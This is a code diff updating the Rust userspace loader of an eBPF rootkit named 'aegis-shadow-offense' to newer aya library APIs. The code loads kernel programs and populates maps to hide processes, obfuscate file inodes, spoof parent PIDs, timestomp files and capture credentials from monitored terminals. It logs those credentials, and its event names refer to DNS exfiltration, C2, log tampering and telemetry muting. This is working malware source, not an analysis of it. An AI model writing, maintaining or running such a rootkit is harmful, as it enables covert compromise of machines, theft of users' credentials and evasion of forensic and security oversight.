@@ -1,16 +1,17 @@
 use anyhow::{Context, Result};
 use aya::{
     include_bytes_aligned,
-    maps::{HashMap, PerfEventArray},
+    maps::{AsyncPerfEventArray, HashMap},
     programs::{KProbe, Xdp, XdpFlags, TracePoint, tc::{SchedClassifier, TcAttachType}},
-    Bpf, Btf,
+    Ebpf, Btf,
 };
-use aya_log::BpfLogger;
+use aya_log::EbpfLogger;
+use bytes::BytesMut;
 use clap::Parser;
 use common::{
-    RootkitConfig, EventHeader, CredentialCapture, DnsExfilChunk, TimestompEntry,
+    RootkitConfig, EventHeader, CredentialCapture, TimestompEntry,
     EVENT_PROC_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_FILE_OBFUSCATED,
-    EVENT_CRED_CAPTURED, EVENT_LOG_TAMPERED, EVENT_ANCESTRY_SPOOFED,
+    EVENT_LOG_TAMPERED, EVENT_ANCESTRY_SPOOFED,
     EVENT_DNS_EXFIL, EVENT_KALLSYMS_HIDDEN, EVENT_ANTI_DETACH,
     EVENT_TIMESTOMPED, EVENT_C2_AUTH_FAILED, EVENT_TELEMETRY_MUTED,
     BPF_PIN_PATH,
@@ -19,7 +20,6 @@ use log::{info, warn, error, debug};
 use std::fs;
 use std::path::Path;
 use tokio::signal;
-use tokio::time::{sleep, Duration};
 
 #[derive(Debug, Parser)]
 #[command(name = "aegis-shadow-offense")]
@@ -82,23 +82,23 @@ async fn main() -> Result<()> {
 
     // Load eBPF bytecode
     #[cfg(debug_assertions)]
-    let mut bpf = Bpf::load(include_bytes_aligned!(
+    let mut bpf = Ebpf::load(include_bytes_aligned!(
         "../../target/bpfel-unknown-none/debug/offense"
     ))?;
     #[cfg(not(debug_assertions))]
-    let mut bpf = Bpf::load(include_bytes_aligned!(
+    let mut bpf = Ebpf::load(include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/offense"
     ))?;
 
     // Load BTF if available
-    if let Ok(btf) = Btf::from_sys_fs() {
+    if Btf::from_sys_fs().is_ok() {
         info!("✓ BTF loaded from /sys/kernel/btf/vmlinux");
     } else {
         warn!("⚠ BTF not available - CO-RE features may not work");
     }
 
     // Initialize BPF logger
-    if let Err(e) = BpfLogger::init(&mut bpf) {
+    if let Err(e) = EbpfLogger::init(&mut bpf) {
         warn!("Failed to initialize eBPF logger: {}", e);
     }
 
@@ -259,14 +259,14 @@ async fn main() -> Result<()> {
     // Apply CLI configurations
     if let Some(pid) = cli.hide_pid {
         let mut hidden_pids: HashMap<_, u32, u8> =
-            HashMap::try_from(bpf.map_mut("HIDDEN_PIDS")?)?;
+            HashMap::try_from(bpf.map_mut("HIDDEN_PIDS").context("HIDDEN_PIDS not found")?)?;
         hidden_pids.insert(pid, 1u8, 0)?;
         info!("✓ Hiding PID: {}", pid);
     }
 
     if let Some(inode) = cli.obfuscate_inode {
         let mut obfuscate_inodes: HashMap<_, u64, u8> =
-            HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES")?)?;
+            HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES").context("OBFUSCATE_INODES not found")?)?;
         obfuscate_inodes.insert(inode, 1u8, 0)?;
         info!("✓ Obfuscating inode: {}", inode);
     }
@@ -275,7 +275,7 @@ async fn main() -> Result<()> {
         if let Some((major, minor)) = parse_tty_device(&tty) {
             let dev_key = ((major as u64) << 32) | (minor as u64);
             let mut monitored_ttys: HashMap<_, u64, u8> =
-                HashMap::try_from(bpf.map_mut("MONITORED_TTYS")?)?;
+                HashMap::try_from(bpf.map_mut("MONITORED_TTYS").context("MONITORED_TTYS not found")?)?;
             monitored_ttys.insert(dev_key, 1u8, 0)?;
             info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
         } else {
@@ -286,7 +286,7 @@ async fn main() -> Result<()> {
     if let Some(spoof) = cli.spoof_ppid {
         if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
             let mut spoofed_ppids: HashMap<_, u32, u32> =
-                HashMap::try_from(bpf.map_mut("SPOOFED_PPIDS")?)?;
+                HashMap::try_from(bpf.map_mut("SPOOFED_PPIDS").context("SPOOFED_PPIDS not found")?)?;
             spoofed_ppids.insert(pid, fake_ppid, 0)?;
             info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
         } else {
@@ -297,7 +297,7 @@ async fn main() -> Result<()> {
     if let Some(ts) = cli.timestomp {
         if let Some((inode, entry)) = parse_timestomp(&ts) {
             let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> =
-                HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES")?)?;
+                HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES").context("TIMESTOMP_INODES not found")?)?;
             timestomp_inodes.insert(inode, entry, 0)?;
             info!("✓ Timestomping inode: {}", inode);
         } else {
@@ -318,7 +318,7 @@ async fn main() -> Result<()> {
     Ok(())
 }
 
-fn pin_all_maps(bpf: &mut Bpf) -> Result<()> {
+fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
     let pin_path = Path::new(BPF_PIN_PATH);
     if !pin_path.exists() {
         fs::create_dir_all(pin_path)?;
@@ -334,78 +334,93 @@ fn pin_all_maps(bpf: &mut Bpf) -> Result<()> {
     Ok(())
 }
 
-async fn monitor_events(mut bpf: Bpf) {
-    let mut events: PerfEventArray<_> = match bpf.map_mut("EVENTS") {
-        Ok(map) => match PerfEventArray::try_from(map) {
-            Ok(perf) => perf,
-            Err(e) => {
-                error!("Failed to get EVENTS perf array: {}", e);
-                return;
-            }
-        },
+async fn monitor_events(mut bpf: Ebpf) {
+    let events_map = match bpf.take_map("EVENTS") {
+        Some(map) => map,
+        None => {
+            error!("Failed to get EVENTS map");
+            return;
+        }
+    };
+    let mut events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(events_map) {
+        Ok(perf) => perf,
         Err(e) => {
-            error!("Failed to get EVENTS map: {}", e);
+            error!("Failed to get EVENTS perf array: {}", e);
             return;
         }
     };
 
-    let mut cred_events: PerfEventArray<_> = match bpf.map_mut("CRED_EVENTS") {
-        Ok(map) => match PerfEventArray::try_from(map) {
-            Ok(perf) => perf,
-            Err(e) => {
-                error!("Failed to get CRED_EVENTS perf array: {}", e);
-                return;
-            }
-        },
+    let cred_map = match bpf.take_map("CRED_EVENTS") {
+        Some(map) => map,
+        None => {
+            error!("Failed to get CRED_EVENTS map");
+            return;
+        }
+    };
+    let mut cred_events: AsyncPerfEventArray<_> = match AsyncPerfEventArray::try_from(cred_map) {
+        Ok(perf) => perf,
         Err(e) => {
-            error!("Failed to get CRED_EVENTS map: {}", e);
+            error!("Failed to get CRED_EVENTS perf array: {}", e);
             return;
         }
     };
 
     let cpus = aya::util::online_cpus().unwrap_or_else(|_| vec![0]);
-    let mut event_buffers = Vec::new();
-    let mut cred_buffers = Vec::new();
+    info!("Event monitoring started on {} CPUs", cpus.len());
 
     for cpu in cpus.iter() {
         if let Ok(buf) = events.open(*cpu, None) {
-            event_buffers.push(buf);
+            tokio::spawn(async move {
+                process_event_buf(buf).await;
+            });
         }
         if let Ok(buf) = cred_events.open(*cpu, None) {
-            cred_buffers.push(buf);
+            tokio::spawn(async move {
+                process_cred_buf(buf).await;
+            });
         }
     }
+}
 
-    info!("📊 Event monitoring started on {} CPUs", cpus.len());
-
+async fn process_event_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
+    let mut bufs = (0..10).map(|_| BytesMut::with_capacity(1024)).collect::<Vec<_>>();
     loop {
-        sleep(Duration::from_millis(100)).await;
-
-        // Process general events
-        for buf in event_buffers.iter_mut() {
-            while let Ok(events) = buf.read_events(&mut []) {
-                for event_data in events {
-                    if event_data.len() >= std::mem::size_of::<EventHeader>() {
-                        let event = unsafe {
-                            std::ptr::read(event_data.as_ptr() as *const EventHeader)
-                        };
-                        log_event(&event);
-                    }
-                }
+        let events = match buf.read_events(&mut bufs).await {
+            Ok(events) => events,
+            Err(e) => {
+                error!("Error reading events: {}", e);
+                return;
+            }
+        };
+        for i in 0..events.read {
+            let data = &bufs[i];
+            if data.len() >= std::mem::size_of::<EventHeader>() {
+                let event = unsafe {
+                    std::ptr::read_unaligned(data.as_ptr() as *const EventHeader)
+                };
+                log_event(&event);
             }
         }
+    }
+}
 
-        // Process credential capture events
-        for buf in cred_buffers.iter_mut() {
-            while let Ok(events) = buf.read_events(&mut []) {
-                for event_data in events {
-                    if event_data.len() >= std::mem::size_of::<CredentialCapture>() {
-                        let capture = unsafe {
-                            std::ptr::read(event_data.as_ptr() as *const CredentialCapture)
-                        };
-                        log_credential_capture(&capture);
-                    }
-                }
+async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
+    let mut bufs = (0..10).map(|_| BytesMut::with_capacity(1024)).collect::<Vec<_>>();
+    loop {
+        let events = match buf.read_events(&mut bufs).await {
+            Ok(events) => events,
+            Err(e) => {
+                error!("Error reading cred events: {}", e);
+                return;
+            }
+        };
+        for i in 0..events.read {
+            let data = &bufs[i];
+            if data.len() >= std::mem::size_of::<CredentialCapture>() {
+                let capture = unsafe {
+                    std::ptr::read_unaligned(data.as_ptr() as *const CredentialCapture)
+                };
+                log_credential_capture(&capture);
             }
         }
     }
@@ -489,10 +504,9 @@ fn parse_timestomp(s: &str) -> Option<(u64, TimestompEntry)> {
     let ctime = parts[3].parse::<u64>().ok()?;
     
     Some((inode, TimestompEntry {
-        fake_atime_sec: atime,
         fake_mtime_sec: mtime,
+        fake_atime_sec: atime,
         fake_ctime_sec: ctime,
-        _pad: 0,
     }))
 }
 
